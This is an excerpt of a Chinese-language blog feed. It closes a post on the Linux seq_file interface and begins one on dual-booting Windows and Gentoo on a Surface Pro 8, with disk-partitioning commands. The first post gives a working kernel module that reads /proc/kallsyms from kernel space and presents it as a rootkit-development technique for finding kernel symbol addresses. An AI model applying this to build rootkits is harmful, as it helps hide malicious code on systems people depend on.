file);<br>&#125;<br>EXPORT_SYMBOL(seq_release_private);<br></code></pre></td></tr></table></figure><blockquote><p>至此序列文件接口的实现基本完结，可以看到这个实现其实非常的简洁，这个场景在内核中其实非常常见（例如读取各种内核对象的信息），对于开发者而言并不需要每个场景都手写一套，因此通用的序列文件接口应运而生</p></blockquote><h1 id="0x03-序列文件接口-其他"><a href="#0x03-序列文件接口-其他" class="headerlink" title="0x03. 序列文件接口 - 其他"></a>0x03. 序列文件接口 - 其他</h1><p>序列文件接口其实没啥更多能讲的东西了，这一节主要记录一些比较零碎的迷思</p><h2 id="在内核中读取特殊序列文件"><a href="#在内核中读取特殊序列文件" class="headerlink" title="在内核中读取特殊序列文件"></a>在内核中读取特殊序列文件</h2><!--因为序列文件接口被开发出来的目的便是为了向用户空间导出内核数据，因此在内核空间读取序列文件在设计初期并没有被考虑到， 所以数据拷贝使用的是 AIO 接口的 `copy_to_iter()` ，**仅用来将数据从内核空间拷贝到用户空间** ，因此你无法通过 `kernel_read()` 这样的 API 来读取这类文件--><p>部分的序列文件接口对于内核空间是不可以使用 <code>kernel_read()</code> 进行读取的，因为其文件函数表实现的是 <code>read()</code> 接口而非 <code>read_iter()</code> 接口，但是实战开发中我们往往又需要在内核空间读取一些序列文件，这通常是因为这一部分内核数据的获取接口并不对内核驱动导出，但留有向用户空间导出的序列文件接口，此时序列文件接口便几乎是我们唯一的数据获取方式</p><blockquote><p>例如在 rootkit 开发当中我们通常需要获取各种内核符号的地址，但对应的获取内核符号的内核接口 <code>kallsyms_lookup_name()</code> 在内核版本 <code>5.7.0</code> 后默认不再导出，因此我们只能通过读取 <code>/proc/kallsyms</code>  进行获取</p></blockquote><p>解决的方案其实很简单： <strong>我们只需要分配一块属于用户空间的临时内存即可</strong> ，这可以通过 <code>vm_mmap() &amp; vm_munmap()</code> 完成，下面是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mman.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>;</span><br>    <span class="hljs-type">char</span> __user *ubuf;<br>    <span class="hljs-type">char</span> *kbuf;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">ssize_t</span> read_len;<br>    <span class="hljs-type">loff_t</span> fpos;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    ubuf = (<span class="hljs-type">void</span>*) vm_mmap(<span class="hljs-literal">NULL</span>,<br>                           <span class="hljs-number">0</span>,<br>                           PAGE_SIZE,<br>                           PROT_READ | PROT_WRITE,<br>                           MAP_ANONYMOUS | MAP_PRIVATE,<br>                           <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!ubuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate userspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_ret;<br>    &#125;<br><br>    filp = filp_open(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IS_ERR(filp)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to open file! Error code: %ld\n&quot;</span>,<br>               PTR_ERR(filp));<br>        ret = PTR_ERR(filp);<br>        <span class="hljs-keyword">goto</span> out_free_ubuf;<br>    &#125;<br><br>    kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!kbuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate kernelspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(kbuf, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    fpos = <span class="hljs-number">0</span>;<br>    read_len = filp-&gt;f_op-&gt;read(filp, ubuf, PAGE_SIZE, &amp;fpos);<br>    filp-&gt;f_pos = fpos;<br>    <span class="hljs-keyword">if</span> (read_len &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to read file! Error code: %ld\n&quot;</span>,<br>              read_len);<br>        ret = read_len;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(kbuf, ubuf, read_len)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to copy data to kernel!\n&quot;</span>);<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Got data: %s\n&quot;</span>, kbuf);<br><br>out_close_file:<br>    filp_close(filp, <span class="hljs-literal">NULL</span>);<br>out_free_ubuf:<br>    vm_munmap((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ubuf, PAGE_SIZE);<br>out_ret:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>成功读取 <code>/proc/kallsyms</code> 文件：</p><p><img src="https://s2.loli.net/2024/06/03/juGzqY8l1DJUeiK.png"></p><blockquote><p>注意到这里我们读取的数据似乎不太对？这实际上是因为权限不足的缘故（在 sudo insmod 下我们的主体凭证虽然提升到了 root，但是与文件权限相关的客体凭证不与 sudo 相关联，因此在打开文件之前我们需要 <strong>在内核中手动进行提权</strong> ，完成读取后再降回原权限（可选）</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;真是序序又列列啊，你们有没有这样的文件接口啊我想问&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="文件系统" scheme="https://arttnba3.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="序列文件接口" scheme="https://arttnba3.github.io/tags/%E5%BA%8F%E5%88%97%E6%96%87%E4%BB%B6%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x02】在 Surface Pro 8 上安装 Gentoo</title>
    <link href="https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/"/>
    <id>https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/</id>
    <published>2024-04-29T19:23:41.000Z</published>
    <updated>2024-12-17T12:40:55.533Z</updated>
    
    <content type="html"><![CDATA[<p>省流：最后装回了 openSUSE Tumbleweed</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>熟悉的废话环节，可以直接跳过不看：）</p></blockquote><p>熟悉笔者的朋友都知道笔者是一个微软死忠粉（ <del>虽然这位微软死忠粉现在并没有在将由微软开发的操作系统作为主力</del> ），因此手上自然而然会有一些 Surface 设备（当然绝大部分都出二手回血了，👴只能说学生时代缺钱的穷 b 是这样的），恰好笔者手边有一台闲置的 Surface Pro 8 设备，而 Surface 从这一代设备开始有一个支持方便快捷地自行更换硬盘的设计，同时笔者原有的设备是最低配的版本 （8G 运存 + 128G 存储），因此笔者就想把这台陪伴了笔者大四期间多个夜晚的设备（因为晚上宿舍断电，所以有这样一台续航长的办公本还是很重要的， <del>当然这里肯定有人要问为什么不用 macbook 了，虽然说 mac 的续航时间确实比 Windows 阵营任何的笔记本要长得多，但是笔者当时并没有钱能够买得起哪怕是一台二手的 macbook，而且既然都买 macbook 了再买二手未免有些寒碜，可能有人又会抬杠说 Surface 都买了怎么买不起 macbook，毕竟最低配的 Surface 价格终究是比最低配的 macbook 要便宜不少，同时还有一个比较重要的原因便是笔者此前很多工作还是需要在 X86 平台上完成，mac 下虽然有 Rosetta 或是 Parallel，但是转译终究还是会带来一定的性能损耗，而且使用起来并不优雅，那这里可能又会有人问为什么不买联想或是其他牌子的同价位办公本，那👴只能说田牌就是信仰</del> ）给简单升级一下，在替换大容量硬盘的同时顺便装一个 Windows + Linux 双系统，<strong>前者是为了保留原汁原味的 Surface 体验，后者则是纯粹为了瞎折腾</strong>：）</p><p>出于各种因素的考虑（ <del>可能是偷工减料</del> ）微软为 Surface Pro 选用了 2230 规格的 SSD，这个规格的 SSD 并不好找，尤其是笔者目前肉身位于地大物穷的位于大洋彼岸离所有国家都很远的澳洲，找了半天<a href="https://cplonline.com.au/micron-mtfdkbk2t0qfm-1bd1aabyyr-2400-2tb-m-2-2230-nvme-ssd.html">才在 CPL 上找到一款镁光的 2230 规格的 2TB SSD</a>，虽然商品页面写着 <code>NOT Compatible with Surface Pro 8/9</code> ，但是<strong>在笔者看来理论上来说不兼容的情况不太可能发生</strong>，同时笔者在微软社区上找到了 <a href="https://answers.microsoft.com/en-us/surface/forum/all/what-is-the-max-ssd-my-surface-pro8-will-accept/4cf1ff6d-0bb8-415a-a4b9-690e31808f34">一篇成功在 Surface Pro 8 上安装这一款 SSD 的帖子</a>，那“不兼容”一说想来应当是无稽之谈（又或者是微软的商业手段，<strong>事实证明确实是可以兼容的</strong>），因此笔者选了一个风和日丽 <del>但其实下着细雨</del> 的日子前往墨尔本的某家 CPL 线下门店取到了这款 SSD （ <del>是的这就是发达国家比较常见的购物方式，没有国内那样发达的物流网络说实话👴感觉买啥都不方便，当然出来活动活动筋骨也是好的</del> ）</p><p><img src="https://s2.loli.net/2024/04/27/q3giJxNV9ZpvrIS.png" alt="价格比国内贵上好几百 RMB，澳洲的大部分电子产品都是如此"></p><p>接下来是对系统发行版的选择，Windows 自然不用说直接装最新的 Win 11，那么 Linux 该选择哪一种发行版呢？首先考虑比较贴近上游的 Linux 发行版——</p><ul><li>出于瞎折腾的角度考虑 <code>Arch Linux</code> 自然是提供了一定的折腾空间以及 AUR 的海量软件包，在为系统带来极高的可定制性的同时你几乎可以在 AUR 上找到任何软件</li><li><code>Fedora Workstation</code> 作为 RHEL 的试验田同时也是 Linus 所用的发行版在紧贴上游的同时提供了不弱于 Arch 的先进性，有着来自红帽的强大技术支持，软件更新比一部分滚动发行版还要激进，  <del>更是能第一时间当 RedHat 的小白鼠</del></li><li><code>openSUSE Tumbleweed</code> 则有着 SUSE 那来自德国人的精确与严谨，在兼顾稳定性的同时保持了滚动更新紧贴上游（更有着 Slowroll 这样等着 Tumbleweed 滚稳了再更新的“慢滚”发行版），YaST 更像一个温柔的大姐姐一样能帮你轻松解决相当多的各类需求， <em>因此这也是笔者的主力笔记本所使用的 Linux 发行版</em></li></ul><p><img src="https://s2.loli.net/2024/04/30/62x7yCpgKwqOYHj.png" alt="熟悉笔者的都知道笔者一直都是 SUSE 批.jpg"></p><p>虽然这些都是笔者比较喜欢的发行版，但思来想去笔者还是决定安装一个不太常规的 Linux 发行版—— <a href="https://gentoo.org/">Gentoo Linux</a> ，最直接的原因就是<strong>这是一个少有的原生从源码安装软件包的滚动 Linux 发行版</strong> ，任何软件都需要自行在自己的机器上进行编译，<strong>这意味着所有人的软件的二进制包都是不一样的</strong>，虽然说这与目前软工业界所追求的<a href="https://en.wikipedia.org/wiki/Reproducible_builds">“逐位可重复构建”</a> 似乎完全背道而驰，但从软件安全的角度考虑这意味着 <em>哪怕你知道我的电脑上的某个软件中存在二进制漏洞，你也无法直接通过传统的常规 pwn 手法进行攻击</em>  ，这主要是出于一个原因： <strong>现有的漏洞利用方法通常是控制流劫持导向的，针对软件二进制漏洞利用的方式通常是劫持控制流后再利用软件中原有的代码片段构建执行链完成任意代码执行</strong> ，例如现在针对不同程序的不同版本中存在的某一漏洞进行攻击的办法通常是辨别目标软件版本后利用 ROPgadget 或是其他的一些工具来拼凑 ROP chain ，而这样的攻击方法的可行性得以成立的原因则是包括内核在内的软件二进制通常是由软件源侧完成编译后再分发给用户，这意味着在同一发行版上使用同一版本软件的用户所持有的二进制文件都是相同的，因此对于攻击者而言获取相应软件的二进制文件基本上是没什么难度的， <strong>而所有软件都自行编译则可以很大程度上加大攻击者在传统攻击面的攻击难度</strong> ——这在很大程度上满足了笔者的精神洁癖：）</p><blockquote><p>当然可能有人会抬杠说这没什么意义，毕竟现在 <a href="https://arxiv.org/pdf/2401.17618">exploit technique 前沿都在各种 data-only attack</a> ，仅是阻挡攻击者获取 code gadget 的方式是无法完成 100% 的防护的， 可能也有人会抬杠说 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/catc17-introduction-intel-cet-844137.pdf">把 CET 开上不就完事了</a> ， <strong>但对笔者而言能有一定程度的提升那就是有意义的，在笔者看来这并非仅有 0 和 100 的区别</strong> ，同时对于攻击者而言针对所有软件都单独开发 data-only 的攻击手法未免成本就太高了，目前的这类研究还仅集中在操作系统内核或是其他大型软件上</p><p>此外，形如 <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">CFI</a> 这样的防御手法在发行版分发的二进制软件包中很多都是未必开启的，而 Gentoo 这样自定义软件编译选项的发行版可以让你快速在系统各个软件中应用这些防护手段，同时定制自己所想要的优化选项，可能不是最好的，但是<strong>从精神层面而言一定是最适合自己的</strong></p><p> 那又有人可能会说每个开源软件都自己手工拉源码编译不就好了干嘛一定要用 Gentoo，笔者的评价是：</p><p><img src="https://s2.loli.net/2024/05/09/EfglUGYtAqpTSmz.png" alt="男人，什么罐头我说，曼巴出去"> </p></blockquote><p>当然，除了<strong>可以基于自身需求高度定制</strong>这个核心动机以外，Gentoo 有着一个强大的包管理器：<a href="https://wiki.gentoo.org/wiki/Portage">Portage</a> ，通过配置 <code>USE flag</code> 可以按照需求去编译软件包，实现 <strong>如无必要，勿增实体</strong> 的哲学（例如你需要使用的部分软件带有 kde 支持，但你其实并不使用 kde，那么只需要在 <code>/etc/portage/make.conf</code> 中添加 <code>USE=&quot;-kde&quot;</code>  这一 flag，这是一个全局性的例子；又或者对于某些软件包你想要启用&#x2F;禁止某些支持而并不想要把这样的配置全局化，你只需要在 <code>/etc/portage/package.use</code> 目录下创建新配置文件来为指定程序声明 USE 标记，例如 <code>kde-plasma/plasma-meta qt5 -sddm</code> 将为 KDE Plasma 桌面编译上 QT 支持的同时不使用 SDDM；当然，<a href="https://blog.xupeng.me/2006/10/10/met-problem-of-circular-dependencies-with-gentoo/">滥用 USE flags 有可能会来带循环依赖的问题</a>，那这又是另外一件事情了…）， <a href="https://wiki.gentoo.org/wiki/Selected-packages_set_(Portage)">world file</a> 的存在也大幅增添了系统的可重复构建性（硬要说的话在可复现性上肯定比不过 NixOS，但笔者对于 NixOS 这类“不可变系统”的概念说实话不太感冒，反倒觉得对于桌面用户而言这增添了不少没必要的麻烦，不过多学习一门 DSL 倒其实是无所谓的事情，毕竟 reproducible 的体验某种程度上真的很香，但 NixOS 对于笔者而言还有一点劝退的便是 non-FHS compliance ，虽然说 NixOS 可用的软件包确实是数一数二的多，但这样的系统构造在笔者看来并不够优雅）</p><p>最重要的是，<a href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a> 曾经说过：Install Gentoo——</p><p><img src="https://s2.loli.net/2024/04/30/jEKw7bCOu9rMhlD.png" alt="虽然他用的不是 Gentoo 而是 Trisquel.jpg"></p><p>于是在经历了各种思考之后，笔者最终选择在 Surface Pro 上尝试折腾一下 Gentoo Linux 这一个相对而言比较小众的发行版</p><h1 id="0x01-安装-Windows"><a href="#0x01-安装-Windows" class="headerlink" title="0x01. 安装 Windows"></a>0x01. 安装 Windows</h1><p>因为笔者是要用一块全新的硬盘替换掉原有的硬盘，因此系统安装需要重头开始（ <del>虽然实际上有一些已知的系统迁移方案，但是👴太懒了</del> ），因为 Windows 很容易对硬盘分区进行预期外的修改，所以在安装双系统的情况下笔者选择先安装 Windows 再安装 Linux</p><h2 id="替换硬盘"><a href="#替换硬盘" class="headerlink" title="替换硬盘"></a>替换硬盘</h2><p>因为我们后面安装 Linux 要关闭 Secure Boot，因此我们首先需要在设置中关闭 BitLocker，从而确保原硬盘的可用性</p><blockquote><p> 否则后面就只能上 <a href="https://aka.ms/myrecoverykey">https://aka.ms/myrecoverykey</a> 找原有密钥进行恢复了，如果没有登录过微软账户的话那就只能和原硬盘数据彻底说再见了……</p></blockquote><p><img src="https://s2.loli.net/2024/04/24/tIUp49yHldzxkm2.png" alt="这个过程会非常慢，因为 Surface 设备的性能极其拉胯"></p><p>接下来进 UEFI 中关闭 Secure Boot，在关机状态下按住音量增加键不动，之后再按一次电源键即可进入 Surface 的 UEFI 界面，找到 <code>Secure Boot Configuration</code> 选择 <code>None</code> 即可：</p><p><img src="https://s2.loli.net/2024/04/24/q8MC6dsJ5HN3ToX.png" alt="u1s1 Surface 的 UEFI 虽然简介但是凑凑的"></p><p>解锁之后每次开机都会显示一个大大的红色条和一个🔓：</p><p><img src="https://s2.loli.net/2024/04/24/eJkMLOUzrG8NAvl.jpg" alt="丑中丑设计，感觉不如把🔓放在 Win logo 旁边并排"></p><p>然后在关机状态下用手机取卡针在背面的小孔一戳就能更换硬盘了，从 Surface Pro 8 开始微软的设备有了一定的可维护性，不过需要注意的是硬盘螺丝的规格为不太常见的 <code>T3</code> 六角螺丝，以及在完成硬盘更换之后 <strong>需要插电才能开机</strong> ，不过无论是通过 surface connect 还是通过雷电 4 接口插电都是可行的</p><p><img src="https://s2.loli.net/2024/04/27/iQEMbORa8qcP12j.jpg" alt="当然，你也可以选择使用牙签"></p><blockquote><p>然而仅限于 Surface Pro 系列，也就是只有 Pro 8&#x2F;9&#x2F;10（在笔者编写此文时，Pro 10 仅有商业版） 能快捷更换硬盘，Laptop 等其他产品线依然需要繁琐的拆机流程，不过这个便捷拆解设计在笔者看来有点类似之前见过的 ThinkPad 的高端工作站才有的特性🤔 遗憾的是微软如今依然尚未支持更换内存条，<del>否则👴将成为微软的铁血卫士</del></p></blockquote><h2 id="使用-PE-启动盘进行安装"><a href="#使用-PE-启动盘进行安装" class="headerlink" title="使用 PE 启动盘进行安装"></a>使用 PE 启动盘进行安装</h2><blockquote><p>Windows ISO 在 <a href="https://www.microsoft.com/software-download/windows11">微软官网</a> 便能进行下载，这里就不再赘叙了</p></blockquote><p>接下来我们在可移动磁盘（如 U 盘、移动硬盘等设备）上创建 Windows 安装介质，不过由于官网下载的 ISO 镜像缺少了分区表，因此我们需要手动进行配置，在 Windows 上你可以很轻松地使用 <a href="https://rufus.ie/en/">RUFUS</a> 一类的工具完成这一工作，若你和笔者一样日常使用 Linux 作为工作系统，则暂时没有比较好的解决方案</p><p>不过好在使用 PE 启动盘进行安装已经是一个较为成熟的解决方案了，方便起见笔者选择直接使用现有的解决方案进行安装：）</p><p>需要注意的是在这个阶段<strong>触控屏和原装键盘触摸板都是无法使用的，你必须外接键鼠进行使用</strong></p><p><img src="https://s2.loli.net/2024/04/29/RJF6nfCQYvLuesG.png" alt="笔者很久以前自制的启动盘，事实证明这些工具虽然老但是都还挺好用"></p><p>之后就是正常进系统了，不过在更新完成之前<strong>原装键盘触摸板依旧用不了</strong>：</p><p><img src="https://s2.loli.net/2024/04/29/s851nuVo43KpmWj.jpg"></p><h2 id="Extra-手工创建安装介质（not-recommended）"><a href="#Extra-手工创建安装介质（not-recommended）" class="headerlink" title="Extra. 手工创建安装介质（not recommended）"></a>Extra. 手工创建安装介质（not recommended）</h2><p>如果你希望自己动手丰衣足食，则也可以参照这一节的内容，不过笔者不太推荐（<strong>比较浪费时间</strong>）</p><blockquote><p>主要原因是 Windows 安装镜像中并没有提供一个分区表，否则直接 <code>dd</code> 一把梭就好了：(</p></blockquote><p>首先使用 <code>parted</code> 新建分区，这里我们建立一个 GPT 分区表，并建立两个分区：</p><ul><li>一个 NTFS 分区：存放 Windows 安装镜像中的文件</li><li>一个 EFI 分区：存放<a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">由 RUFUS 提供的 EFI 启动程序</a></li></ul><blockquote><p>为什么我们不选择直接拷贝 Win 镜像进 EFI 分区？虽然 Win 镜像本身便是一个可启动的 EFI 分区，但是其安装文件 <code>source/install.wim</code> 通常大于 UEFI specs 所支持的 fat32 文件系统所支持的最大文件大小（4G），虽然部分 OEM 的 UEFI 会额外有对 exFAT 或是 NTFS 的支持，但为了兼容性考虑我们还是选择 fat32，并使用第三方软件 RUFUS 所提供的 EFI 程序</p></blockquote><p>这里的 <code>/dev/sda</code> 为你的 U 盘设备路径，请自行辨别，需要注意的是<strong>NTFS 分区应当在第一位，EFI 分区在第二位</strong> ，否则会导致 <em>无法进行安装</em>  （提示缺少驱动）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/sda</span>                        <br>GNU Parted 3.6<br>Using /dev/sda<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>Warning: The existing disk label on /dev/sda will be destroyed and all data on this disk will be lost. Do you<br>want to continue?<br>Yes/No? Yes                                                               <br>(parted) mkpart windows-iso ntfs 2048 16777215<br>(parted) mkpart efi fat32 16777216 33554432<br>(parted) set 2 esp on                                                     <br>(parted) set 2 boot on                                                    <br>(parted) name 1 Windows                                                   <br>(parted) name 2 EFI                                                       <br>(parted) quit<br>Information: You may need to update /etc/fstab.<br><br></code></pre></td></tr></table></figure><p>然后运行如下两条命令初始化 EFI 分区的文件系统：</p><blockquote><p>需要说明的是与 NTFS 相关的操作在 Linux 下都会特别慢（至少在笔者的机器上如此，这可能和 <code>ntfs-3g</code> 的性能相关），建议 <del>其实也只能</del> 耐心等待：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ntfs /dev/sda1</span><br>Cluster size has been automatically set to 4096 bytes.<br>Initializing device with zeroes: 100% - Done.<br>Creating NTFS volume structures.<br>mkntfs completed successfully. Have a nice day.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.fat -F 32 /dev/sda2</span>               <br>mkfs.fat 4.2 (2021-01-31)<br></code></pre></td></tr></table></figure><p>接下来将 ISO 中数据拷贝到 U 盘当中，再将 <a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">RUFUS</a> 提供的 EFI 镜像拷贝到 EFI 分区即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/&#123;iso,efi,win&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/Win11_23H2_Chinese_Simplified_x64v2.iso /mnt/iso/</span><br>mount: /mnt/iso: WARNING: source write-protected, mounted read-only.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda2 /mnt/efi/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/uefi-ntfs.img /mnt/iso/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/win</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sync</span></span><br></code></pre></td></tr></table></figure><p>之后就能 <del>原神启动</del> 正常启动进入安装界面了，需要注意的是<strong>原装的键盘触摸板完全无法使用，因此你需要额外用扩展坞连接通用无驱键鼠</strong>：</p><blockquote><p>原装键鼠仅在 UEFI 启动阶段可用，目测是 Windows 官网默认的安装介质中并未带有对应的驱动</p></blockquote><p><img src="https://s2.loli.net/2024/04/27/tRg15behirlnsIU.jpg" alt="Windows，启动——"></p><blockquote><p>以及这个安装方式在笔者的电脑上并未成功，但是使用各种第三方的 PE 启动盘提供的第三方工具却能轻松完成， <del>👴只能说 Windows 官方的安装程序确实比较垃圾</del></p></blockquote><h1 id="0x02-安装-Gentoo-Linux"><a href="#0x02-安装-Gentoo-Linux" class="headerlink" title="0x02. 安装 Gentoo Linux"></a>0x02. 安装 Gentoo Linux</h1><p>完成 Windows 安装之后接下来是安装 Gentoo Linux，在开始之前别忘了在 Windows 上进入硬盘管理中划出一块完整的空间留给 Gentoo Linux 使用，这里笔者就不截图了：）</p><h2 id="创建安装介质"><a href="#创建安装介质" class="headerlink" title="创建安装介质"></a>创建安装介质</h2><p>在 <a href="https://www.gentoo.org/downloads/">Gentoo 